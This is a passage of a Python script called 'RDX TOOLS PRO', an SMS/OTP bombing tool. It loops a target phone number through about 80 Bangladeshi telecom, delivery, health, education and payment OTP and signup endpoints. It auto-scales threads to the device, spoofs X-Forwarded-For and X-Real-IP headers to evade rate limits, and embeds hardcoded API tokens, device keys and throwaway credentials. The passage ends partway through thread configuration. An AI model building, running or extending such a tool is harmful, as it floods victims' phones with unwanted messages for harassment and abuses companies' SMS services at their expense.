import requests
import time
import os
import sys
import random
import json
import shutil
import platform
import multiprocessing
from threading import Thread, Lock
import ctypes
from urllib.parse import quote

# --- কনফিগারেশন ---
TOOL_NAME = "RDX TOOLS PRO"
CREATOR_NAME = "RDX HUNTER"
FB_ID = "RDX HUNTER"
TELEGRAM_USER = ""
TELEGRAM_GROUP = "https://t.me/rdx_tools"
VERSION = "3.0 AUTO-ADAPTIVE"

# ============================================================
#           🔥 DEVICE AUTO-DETECTION SYSTEM 🔥
# ============================================================

class DeviceDetector:
    """যেকোনো ডিভাইস অটো ডিটেক্ট করে অপ্টিমাল সেটিংস দিবে"""
    
    def __init__(self):
        self.os_name = platform.system().lower()
        self.os_version = platform.version()
        self.machine = platform.machine().lower()
        self.processor = platform.processor().lower()
        self.is_termux = self._check_termux()
        self.is_android = self._check_android()
        self.is_windows = self.os_name == "windows"
        self.is_linux = self.os_name == "linux"
        self.is_mac = self.os_name == "darwin"
        self.is_pydroid = self._check_pydroid()
        self.is_vps = self._check_vps()
        self.cpu_count = multiprocessing.cpu_count()
        self.ram_gb = self._get_ram()
        self.device_tier = self._calculate_tier()
        self.network_speed = self._test_network()
        self.config = self._get_optimal_config()
    
    def _check_termux(self):
        """Termux ডিটেকশন"""
        return (
            "com.termux" in os.environ.get("PREFIX", "") or
            os.path.exists("/data/data/com.termux") or
            "termux" in os.environ.get("HOME", "").lower()
        )
    
    def _check_pydroid(self):
        """Pydroid 3 ডিটেকশন"""
        return (
            "pydroid" in os.environ.get("HOME", "").lower() or
            os.path.exists("/data/data/ru.iiec.pydroid3") or
            "com.iiec.pydroid" in os.environ.get("PREFIX", "")
        )
    
    def _check_android(self):
        """Android ডিটেকশন"""
        return (
            "android" in self.os_name or
            self.is_termux or
            self.is_pydroid or
            os.path.exists("/system/build.prop") or
            os.path.exists("/system/app")
        )
    
    def _check_vps(self):
        """VPS/Server ডিটেকশন"""
        try:
            if os.path.exists("/proc/cpuinfo"):
                with open("/proc/cpuinfo", "r") as f:
                    content = f.read().lower()
                    if any(x in content for x in ["kvm", "qemu", "virtualbox", "vmware", "xen"]):
                        return True
            if os.path.exists("/sys/class/dmi/id/product_name"):
                with open("/sys/class/dmi/id/product_name", "r") as f:
                    if any(x in f.read().lower() for x in ["kvm", "qemu", "virtual", "vmware", "xen"]):
                        return True
        except Exception:
            pass
        return False
    
    def _get_ram(self):
        """RAM ডিটেকশন (GB)"""
        try:
            if self.is_linux or self.is_android:
                if os.path.exists("/proc/meminfo"):
                    with open("/proc/meminfo", "r") as f:
                        for line in f:
                            if "MemTotal" in line:
                                kb = int(line.split()[1])
                                return round(kb / (1024 * 1024), 1)
            elif self.is_windows:
                try:
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    c_ulonglong = ctypes.c_ulonglong
                    
                    class MEMORYSTATUSEX(ctypes.Structure):
                        _fields_ = [
                            ("dwLength", ctypes.c_ulong),
                            ("dwMemoryLoad", ctypes.c_ulong),
                            ("ullTotalPhys", c_ulonglong),
                            ("ullAvailPhys", c_ulonglong),
                            ("ullTotalPageFile", c_ulonglong),
                            ("ullAvailPageFile", c_ulonglong),
                            ("ullTotalVirtual", c_ulonglong),
                            ("ullAvailVirtual", c_ulonglong),
                            ("ullAvailExtendedVirtual", c_ulonglong),
                        ]
                    
                    stat = MEMORYSTATUSEX()
                    stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                    kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
                    return round(stat.ullTotalPhys / (1024**3), 1)
                except Exception:
                    pass
            elif self.is_mac:
                try:
                    import subprocess
                    result = subprocess.check_output(["sysctl", "hw.memsize"]).decode()
                    return round(int(result.split(":")[1].strip()) / (1024**3), 1)
                except Exception:
                    pass
        except Exception:
            pass
        return 2.0  # Default fallback
    
    def _calculate_tier(self):
        """ডিভাইস টিয়ার ক্যালকুলেশন"""
        score = 0
        
        # CPU Score
        if self.cpu_count >= 16:
            score += 5
        elif self.cpu_count >= 8:
            score += 4
        elif self.cpu_count >= 4:
            score += 3
        elif self.cpu_count >= 2:
            score += 2
        else:
            score += 1
        
        # RAM Score
        if self.ram_gb >= 16:
            score += 5
        elif self.ram_gb >= 8:
            score += 4
        elif self.ram_gb >= 4:
            score += 3
        elif self.ram_gb >= 2:
            score += 2
        else:
            score += 1
        
        # VPS Bonus
        if self.is_vps:
            score += 3
        
        # Termux/Pydroid Penalty (mobile limited)
        if self.is_termux or self.is_pydroid:
            score -= 1
        
        # Tier Calculation
        if score >= 10:
            return "EXTREME"     # VPS / High-end PC
        elif score >= 7:
            return "HIGH"        # Good PC / Gaming phone
        elif score >= 5:
            return "MEDIUM"      # Normal PC / Good phone
        elif score >= 3:
            return "LOW"         # Old PC / Normal phone
        else:
            return "MINIMAL"     # Very old device
    
    def _test_network(self):
        """নেটওয়ার্ক স্পিড টেস্ট"""
        try:
            test_urls = [
                "https://www.google.com",
                "https://www.cloudflare.com",
            ]
            latencies = []
            for url in test_urls:
                try:
                    start = time.time()
                    requests.get(url, timeout=5)
                    latencies.append(time.time() - start)
                except Exception:
                    pass
            
            if not latencies:
                return "unknown"
            
            avg_latency = sum(latencies) / len(latencies)
            
            if avg_latency < 0.3:
                return "excellent"    # Fiber / 5G
            elif avg_latency < 0.8:
                return "good"         # 4G / Broadband
            elif avg_latency < 1.5:
                return "average"      # 3G / Normal
            else:
                return "slow"         # 2G / Bad
        except Exception:
            return "unknown"
    
    def _get_optimal_config(self):
        """ডিভাইস অনুযায়ী অপ্টিমাল কনফিগ"""
        tier = self.device_tier
        network = self.network_speed
        
        # Base config for each tier
        configs = {
            "EXTREME": {
                "threads": 80,
                "delay": 0.0,
                "timeout": 6,
                "batch_size": 50,
                "description": "🔥 EXTREME MODE - VPS/Server Class"
            },
            "HIGH": {
                "threads": 50,
                "delay": 0.02,
                "timeout": 7,
                "batch_size": 30,
                "description": "⚡ HIGH PERFORMANCE - Gaming/High-end"
            },
            "MEDIUM": {
                "threads": 30,
                "delay": 0.05,
                "timeout": 8,
                "batch_size": 20,
                "description": "💪 BALANCED MODE - Normal Device"
            },
            "LOW": {
                "threads": 15,
                "delay": 0.1,
                "timeout": 10,
                "batch_size": 10,
                "description": "🌱 LIGHT MODE - Old Device"
            },
            "MINIMAL": {
                "threads": 8,
                "delay": 0.2,
                "timeout": 12,
                "batch_size": 5,
                "description": "🍃 MINIMAL MODE - Very Old Device"
            }
        }
        
        config = configs.get(tier, configs["MEDIUM"]).copy()
        
        # Network-based adjustment
        if network == "excellent":
            config["threads"] = int(config["threads"] * 1.5)
            config["delay"] = max(0, config["delay"] * 0.5)
        elif network == "good":
            config["threads"] = int(config["threads"] * 1.2)
        elif network == "slow":
            config["threads"] = int(config["threads"] * 0.6)
            config["delay"] = config["delay"] * 2
            config["timeout"] += 5
        
        # Mobile device special handling
        if self.is_termux or self.is_pydroid:
            config["threads"] = min(config["threads"], 40)  # Cap for mobile
            config["delay"] = max(config["delay"], 0.05)     # Min delay
            config["timeout"] = min(config["timeout"], 10)   # Cap timeout
        
        # Ensure valid ranges
        config["threads"] = max(1, min(config["threads"], 150))
        config["delay"] = max(0, min(config["delay"], 2.0))
        config["timeout"] = max(3, min(config["timeout"], 20))
        
        return config
    
    def display_info(self):
        """ডিভাইস ইনফরমেশন ডিসপ্লে"""
        width = min(get_terminal_width(), 90)
        line = "═" * (width - 4)
        
        # Device type
        if self.is_termux:
            device_type = "📱 Termux (Android)"
        elif self.is_pydroid:
            device_type = "📱 Pydroid 3 (Android)"
        elif self.is_android:
            device_type = "📱 Android"
        elif self.is_windows:
            device_type = "💻 Windows PC"
        elif self.is_mac:
            device_type = "🍎 macOS"
        elif self.is_linux:
            device_type = "🐧 Linux"
        else:
            device_type = f"❓ {self.os_name.title()}"
        
        if self.is_vps:
            device_type += " [VPS/Server]"
        
        # Tier colors
        tier_colors = {
            "EXTREME": C.RED,
            "HIGH": C.ORANGE,
            "MEDIUM": C.YELLOW,
            "LOW": C.GREEN,
            "MINIMAL": C.CYAN,
        }
        tier_color = tier_colors.get(self.device_tier, C.WHITE)
        
        # Network colors
        net_colors = {
            "excellent": C.NEON,
            "good": C.GREEN,
            "average": C.YELLOW,
            "slow": C.RED,
            "unknown": C.DIM,
        }
        net_color = net_colors.get(self.network_speed, C.WHITE)
        
        print(f"\n{C.CYAN}╔{line}╗{C.RESET}")
        print(f"{C.CYAN}║{C.RESET} {C.GOLD}{C.BOLD}🖥️  DEVICE AUTO-DETECTION{C.RESET}"
              f"{' ' * (width - 32)}{C.CYAN}║{C.RESET}")
        print(f"{C.CYAN}╠{line}╣{C.RESET}")
        
        info = [
            ("Device", device_type),
            ("OS", f"{platform.system()} {platform.release()}"),
            ("CPU Cores", f"{self.cpu_count} cores"),
            ("RAM", f"{self.ram_gb} GB"),
            ("Device Tier", f"{tier_color}{self.device_tier}{C.RESET}"),
            ("Network", f"{net_color}{self.network_speed.upper()}{C.RESET}"),
            ("", ""),
            ("Mode", f"{tier_color}{self.config['description']}{C.RESET}"),
            ("Auto Threads", f"{C.GREEN}{self.config['threads']}{C.RESET}"),
            ("Auto Delay", f"{C.GREEN}{self.config['delay']}s{C.RESET}"),
            ("Auto Timeout", f"{C.GREEN}{self.config['timeout']}s{C.RESET}"),
        ]
        
        for label, value in info:
            if not label and not value:
                print(f"{C.CYAN}║{C.RESET}{' ' * (width - 4)}{C.CYAN}║{C.RESET}")
                continue
            content = f"  {C.YELLOW}{label:<14}{C.WHITE} : {value}{C.RESET}"
            visible = len(label) + 3 + len(str(value).replace('\033', '')) + 2
            # Simple padding calculation
            padding = max(0, width - 4 - len(label) - 17)
            print(f"{C.CYAN}║{C.RESET} {content}{' ' * padding} {C.CYAN}║{C.RESET}")
        
        print(f"{C.CYAN}╚{line}╝{C.RESET}")


# ============================================================
#           🔥 API TEMPLATES (৮০+ Endpoints) 🔥
# ============================================================

API_TEMPLATES = [
    # ==================== Grameenphone APIs ====================
    ("POST", "https://weblogin.grameenphone.com/backend/api/v1/otp",
        {"msisdn": "{phone}"}),
    ("POST", "https://webloginda.grameenphone.com/backend/api/v1/otp",
        {"msisdn": "{phone}"}),
    ("POST", "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
        {"deviceId": "35{phone}30", "msisdn": "{phone}", "tran_type": "OTPREQSIGNUP"}),
    ("POST", "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        {"phone": "{phone}", "email": "", "language": "en"}),
    ("POST", "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp",
        {"msisdn": "{phone}"}),
    ("POST", "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
        {"mobileNumber": "{phone}"}),
    ("POST", "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/",
        None),
    ("POST", "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D",
        {"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", "referenceCode": "20190827042622"}}),
    
    # ==================== Robi APIs ====================
    ("POST", "https://webapi.robi.com.bd/v1/account/register/otp",
        {"phone_number": "{phone}"}),
    ("POST", "https://www.robi.com.bd/en",
        [{"msisdn": "{phone}"}]),
    
    # ==================== Banglalink ====================
    ("POST", "https://api.banglalink.net/api/v1/otp/send",
        {"msisdn": "{phone}"}),
    
    # ==================== RedX ====================
    ("POST", "https://api.redx.com.bd/v1/user/signup",
        {"name": "{phone}", "service": "redx", "phoneNumber": "{phone}"}),
    ("POST", "https://api.redx.com.bd:443/v1/user/signup",
        {"name": "{phone}", "service": "redx", "phoneNumber": "{phone}"}),
    ("POST", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        {"phoneNumber": "{phone}"}),
    
    # ==================== Pathao ====================
    ("POST", "https://api.pathao.com/api/v1/auth/login",
        {"phone": "{phone}"}),
    
    # ==================== Food Delivery ====================
    ("POST", "https://api.foodpanda.com.bd/api/v1/auth/login",
        {"phone": "{phone}"}),
    ("POST", "https://api.foodpanda.com.bd/api/v2/auth/login",
        {"phone": "{phone}"}),
    ("POST", "https://api.kfcbd.com/register",
        {"id": None, "name": "RDX User", "email": "rdx{random}@gmail.com",
         "mobile": "{phone}", "address": None, "device_token": "dLvYmVLqT02A_ZAFsFa8gJ",
         "token": None, "dob": "", "otp": None}),
    ("POST", "https://foodaholic.com.bd/api/v1/auth/forgot-password",
        {"phone": "{phone+880}"}),
    ("POST", "https://foodaholic.com.bd/api/v1/auth/sign-up",
        {"f_name": "RDX", "l_name": "User", "phone": "{phone+880}",
         "email": "rdx{random}@gmail.com", "password": "Rdx@12345", "ref_code": ""}),
    
    # ==================== E-commerce ====================
    ("POST", "https://www.shwapno.com/api/auth",
        {"phoneNumber": "{phone+880}"}),
    ("POST", "https://www.bdstall.com/userRegistration/save_otp_info/",
        {"UserTypeID": "2", "RequestType": "1", "Name": "Md", "Mobile": "{phone}"}),
    ("POST", "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("POST", "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile",
        {"number": "{phone}"}),
    ("POST", "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}",
        None),
    ("POST", "https://app.kireibd.com/api/v2/send-login-otp",
        {"email": "{phone}"}),
    ("POST", "https://frontendapi.kireibd.com/api/v2/send-login-otp",
        {"email": "{phone}"}),
    
    # ==================== Bikroy ====================
    ("GET", "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        None),
    
    # ==================== Education ====================
    ("POST", "https://api.shikho.com/auth/v2/send/sms",
        {"phone": "{phone}", "type": "student", "auth_type": "signup", "vendor": "shikho"}),
    ("POST", "https://api.shikho.com/public/activity/otp",
        {"phone": "{phone}", "intent": "ap-discount-request"}),
    ("POST", "https://api.ostad.app/api/v2/user/with-otp",
        {"msisdn": "{phone}"}),
    ("POST", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
        {"mobile_no": "{phone}"}),
    ("POST", "https://www.ieducationbd.com/api/account/check_user",
        {"mobile": "{phone}"}),
    ("POST", "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        {"country_code": "+88", "phone": "{phone}"}),
    ("POST", "https://new.mojaru.com/api/student/login",
        {"mobile_or_email": "{phone}"}),
    
    # ==================== Health ====================
    ("POST", "https://api.medeasy.health/api/send-otp/+88{phone}/",
        None),
    ("POST", "https://api.doctime.com.bd/api/authenticate",
        {"contact_no": "{phone}", "country_calling_code": "88"}),
    ("POST", "https://api.doctime.net/api/v2/authenticate",
        {"country_calling_code": "88", "contact_no": "{phone}", "timestamp": 1777760060}),
    ("POST", "https://doctorlivebd.com/api/patient/auth/otpsend",
        {"country_code": "880", "mobile": "{phone}"}),
    ("POST", "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10",
        {"mobile": "{phone}", "fcmToken": "", "referral": ""}),
    
    # ==================== Transport ====================
    ("POST", "https://chokrojan.com/api/v1/passenger/login/mobile",
        {"mobile_number": "{phone}", "otp_token": "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"}),
    
    # ==================== Entertainment ====================
    ("POST", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("POST", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("POST", "https://api.binge.buzz/api/v4/auth/otp/send",
        {"phone": "{phone+880}"}),
    ("POST", "https://web-api.binge.buzz/api/v3/otp/send/{phone}",
        None),
    
    # ==================== Payment ====================
    ("POST", "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        {"wallet_number": "{phone}", "geo_location": {"lat": 23.8979093, "long": 89.1356346},
         "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"}),
    
    # ==================== Job Portal ====================
    ("POST", "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount",
        {"firstName": "RDX", "lastName": "User", "gender": "M", "email": "rdx{random}@gmail.com",
         "userName": "{phone}", "password": "Rdx@12345", "confirmPassword": "Rdx@12345",
         "status": 0, "mobile": "{phone}", "workAreaCategory": 2, "createdFrom": 0,
         "createdAt": "{timestamp}", "decodeId": "", "catTypeId": 1, "userNameType": "mobile",
         "disabilityId": "", "deviceTypeId": 0, "countryCode": "88", "socialMediaId": "",
         "socialMediaName": "", "socialMediaTimestamp": "{timestamp}", "ttcId": "", "gradeId": "",
         "knownBy": "", "isTtc": False, "trainingCenterName": "", "trainingDistrict": "",
         "queryString": "", "campaignId": 0, "campaignSource": "", "campaignReferer": "",
         "isFromSocialMedia": False, "isActive": 0, "useType": "", "uNtype": 0}),
    
    # ==================== Fashion ====================
    ("POST", "https://api.sundora.com.bd/api/user/customer/",
        {"customer": {"email": "rdx{random}@gmail.com", "password": "#bUV?'3*N#7N}.g",
         "password_confirmation": "#bUV?'3*N#7N}.g", "phone": "{phone+880}",
         "draft_order_id": None, "first_name": "sdfgfd", "last_name": "fgfd",
         "note": {"birthday": "", "gender": "male"}, "withTimeout": True,
         "newsletter_email": True, "newsletter_sms": True}}),
    
    # ==================== Ride Sharing ====================
    ("POST", "https://api.garibookadmin.com/api/v3/user/login",
        {"recaptcha_token": "garibookcaptcha", "mobile": "{phone}", "channel": "web"}),
    ("POST", "https://api.garibookadmin.com/api/v4/user/login",
        {"mobile": "{phone+880}", "recaptcha_token": "garibookcaptcha", "channel": "web"}),
    
    # ==================== Utility ====================
    ("POST", "https://core.easy.com.bd/api/v1/forgot-password-otp",
        {"device_key": "2ea97d276a980993308116baa292cec9", "mobile": "{phone}"}),
    ("POST", "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
        {"phoneNbr": "{phone}", "OTPType": 1.0, "userName": "", "email": ""}),
    ("POST", "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
        {"phone": "{phone}"}),
    ("POST", "https://gateway.otithee.com/api/v1/generate-otp",
        {"request_type": "registration", "mobile_number": "{phone}"}),
    ("POST", "https://bb-api.bohubrihi.com/public/activity/otp",
        {"phone": "{phone}", "intent": "login"}),
    ("POST", "https://backend.timezonebd.com/api/v1/user/otp-login",
        {"phone": "{phone}"}),
    ("POST", "https://edgecoursebd.com/register",
        [{"phone": "{phone}"}]),
    ("POST", "https://api.karigoripathsala.com/api/get-otp?phone={phone}",
        None),
    ("POST", "https://apibeta.iqra-live.com/api/v1/sent-otp/{phone}",
        None),
    ("POST", "https://bcsexamaid.com/api/generateotp",
        {"mobile": "{phone}", "softtoken": "Rifat.Admin.2022"}),
    ("POST", "https://ultimateasiteapi.com/api/register-customer",
        {"customer_name": "RDX", "customer_password": "12345678",
         "customer_password_confirmation": "12345678", "customer_email": "rdx{random}@gmail.com",
         "customer_contact": "{phone}", "customer_dob": "2000-01-02", "customer_gender": "male"}),
    ("POST", "https://billing.proiojon.com/api/v1/auth/sign-up",
        {"name": "RDX{random}", "phone": "{phone}", "email": "rdx{random}@gmail.com",
         "password": "password123", "ref_code": ""}),
    ("POST", "https://api.kabbik.com/v1/auth/otpnew",
        {"msisdn": "88{phone}", "currentTimeLong": "{timestamp_ms}", "passKey": "qOQNBtVmoTTPVmfn"}),
    ("POST", "https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
        {"msisdn": "88{phone}"}),
    ("POST", "https://offers.sindabad.com/api/mobile-otp",
        {"key": "c94e67fb2a59af3b6fa21f24463b2061", "mobile": "+88{phone}"}),
    ("POST", "https://reseller.circle.com.bd/api/v2/auth/signup",
        {"name": "+88{phone}", "email_or_phone": "+88{phone}", "password": "123456",
         "password_confirmation": "123456", "register_by": "phone"}),
    ("POST", "https://api.hishabexpress.com/login/status",
        {"msisdn": "{phone}", "hash": "Hello"}),
    ("POST", "https://mujib.chorcha.net/auth/check?phone={phone}",
        None),
    ("POST", "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login",
        None),
    ("POST", "https://app.priyoshikkhaloy.com/api/user/register-login.php",
        {"mobile": "{phone}"}),
    ("POST", "https://api.apex4u.com/api/auth/login",
        {"phoneNumber": "{phone}"}),
    ("POST", "https://api.chardike.com/api/otp/send",
        {"phone": "{phone}", "otp_type": "login"}),
    ("POST", "https://salextra.com.bd/customer/checkusernameavailabilityonregistration",
        {"username": "{phone}", "loginType": "MOBILE"}),
    ("POST", "https://prod.etestpaper.net/api/v4/auth/otp",
        {"phone": "{phone}", "recaptcha": "668be73dcad2999a957ff440"}),
    ("POST", "https://api.bdtickets.com:20100/v1/auth",
        {"createUserCheck": True, "phoneNumber": "+88{phone}", "applicationChannel": "WEB_APP"}),
    ("POST", "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
        {"phone": "88{phone}"}),
    ("POST", "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}",
        None),
    ("POST", "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT",
        {"company_id": "26", "password2": "Riyaz@123", "currency_code": "BDT",
         "user_type": "C", "email": "{phone}@gmail.com", "g_id": "", "lang_code": "en",
         "operating_system": "Android", "otp_verify": False, "password1": "Riyaz@123",
         "phone": "{phone}", "storefront_id": "3"}),
    ("POST", "https://www.khaasfood.com/wp-admin/admin-ajax.php",
        {"mobileNo": "{phone}", "countrycode": "+880", "csrf": "9d9d08e6e5",
         "login": "1", "json": "1", "action": "digits_check_mob"}),
]


# ============================================================
#                    COLOR CLASS
# ============================================================

class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;135m'
    PINK = '\033[38;5;213m'
    NEON = '\033[38;5;46m'
    GOLD = '\033[38;5;220m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'


def set_title(title):
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except Exception:
            pass
    else:
        print(f"\033]0;{title}\007", end='')


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def get_terminal_width():
    try:
        return shutil.get_terminal_size((80, 20)).columns
    except Exception:
        return 80


def get_random_string(length=8):
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(chars) for _ in range(length))


def get_timestamp():
    return time.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def get_timestamp_ms():
    return int(time.time() * 1000)


# ============================================================
#                    BANNER
# ============================================================

def banner(detector):
    clear_screen()
    width = min(get_terminal_width(), 90)
    line = "═" * (width - 4)

    art = [
        "  ██████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗",
        "  ██╔══██╗██╔══██╗╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝",
        "  ██████╔╝██║  ██║ ╚███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗",
        "  ██╔══██╗██║  ██║ ██╔██╗        ██║   ██║   ██║██║   ██║██║     ╚════██║",
        "  ██║  ██║██████╔╝██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║",
        "  ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝",
    ]

    print(f"{C.CYAN}╔{line}╗{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}{' ' * (width - 4)}{C.CYAN}║{C.RESET}")

    for art_line in art:
        padding = max(0, (width - 4 - len(art_line)) // 2)
        print(f"{C.CYAN}║{C.RESET}{' ' * padding}{C.MAGENTA}{C.BOLD}{art_line}{C.RESET}"
              f"{' ' * max(0, width - 4 - padding - len(art_line))}{C.CYAN}║{C.RESET}")

    print(f"{C.CYAN}║{C.RESET}{' ' * (width - 4)}{C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}╠{line}╣{C.RESET}")

    info_lines = [
        (f"  ⚡ VERSION    ", f"{VERSION}"),
        (f"  👤 CREATOR    ", f"{CREATOR_NAME}"),
        (f"  📘 FACEBOOK   ", f"{FB_ID}"),
        (f"  ✈️  TELEGRAM   ", f"{TELEGRAM_USER if TELEGRAM_USER else 'N/A'}"),
        (f"  🔗 GROUP LINK ", f"{TELEGRAM_GROUP}"),
        (f"  🚀 APIs LOADED", f"{len(API_TEMPLATES)}"),
        (f"  🎯 MODE       ", "AUTO-ADAPTIVE"),
    ]

    for label, value in info_lines:
        content = f"{C.YELLOW}{label}{C.WHITE} : {C.GREEN}{value}{C.RESET}"
        visible = len(label) + 3 + len(value) + 2
        padding = max(0, width - 4 - visible)
        print(f"{C.CYAN}║{C.RESET} {content}{' ' * padding} {C.CYAN}║{C.RESET}")

    print(f"{C.CYAN}╚{line}╝{C.RESET}")


# ============================================================
#                    HEADERS
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
]

ACCEPT_HEADERS = [
    "application/json, text/plain, */*",
    "application/json",
    "*/*",
]


def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'Accept': random.choice(ACCEPT_HEADERS),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'bn-BD,bn;q=0.9,en;q=0.8']),
        'Content-Type': 'application/json',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'DNT': '1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }


# ============================================================
#                    GLOBAL STATE
# ============================================================

lock = Lock()
stats = {"total": 0, "success": 0, "failed": 0, "timeout": 0, "error": 0}
stop_flag = {"stop": False}
start_time = time.time()


def replace_placeholders(obj, clean_phone):
    if isinstance(obj, dict):
        return {k: replace_placeholders(v, clean_phone) for k, v in obj.items()}
    if isinstance(obj, list):
        return [replace_placeholders(i, clean_phone) for i in obj]
    if isinstance(obj, str):
        return (obj
                .replace("{phone+880}", f"+880{clean_phone}")
                .replace("{phone}", clean_phone)
                .replace("{random}", get_random_string(6))
                .replace("{timestamp}", get_timestamp())
                .replace("{timestamp_ms}", str(get_timestamp_ms())))
    return obj


def build_api_list(phone: str):
    clean_phone = phone.strip()
    if clean_phone.startswith("+880"):
        clean_phone = clean_phone[4:]
    elif clean_phone.startswith("880"):
        clean_phone = clean_phone[3:]
    elif clean_phone.startswith("0"):
        clean_phone = clean_phone[1:]

    if len(clean_phone) == 10:
        full_phone = "0" + clean_phone
    else:
        full_phone = clean_phone

    api_list = []
    for method, url, payload in API_TEMPLATES:
        final_url = (url
                     .replace("{phone+880}", f"+880{full_phone}")
                     .replace("{phone}", full_phone))
        final_payload = replace_placeholders(payload, full_phone)
        api_list.append({
            "method": method,
            "url": final_url,
            "payload": final_payload,
            "domain": final_url.split('/')[2] if '/' in final_url else final_url
        })
    return api_list


def get_target():
    print(f"\n{C.CYAN}┌{'─' * 60}┐{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.GREEN}🎯 TARGET NUMBER SETUP{C.RESET}"
          f"{' ' * 38}{C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}└{'─' * 60}┘{C.RESET}")
    print(f"{C.YELLOW}  ▸ Format: 01712345678 / 8801712345678 / +8801712345678{C.RESET}")
    number = input(f"{C.MAGENTA}  ▶ Enter Number: {C.RESET}").strip()
    return number


def get_custom_config(detector):
    """User কে auto config দেখিয়ে manual override এর option দেয়"""
    print(f"\n{C.CYAN}┌{'─' * 60}┐{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.GREEN}⚙️  THREAD CONFIGURATION{C.RESET}"
          f"{' ' * 36}{C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}└{'─' * 60}┘{C.RESET}")
    print(f"{C.NEON}  ✅ Auto-Detected Threads: {detector.config['threads']}{C.RESET}")
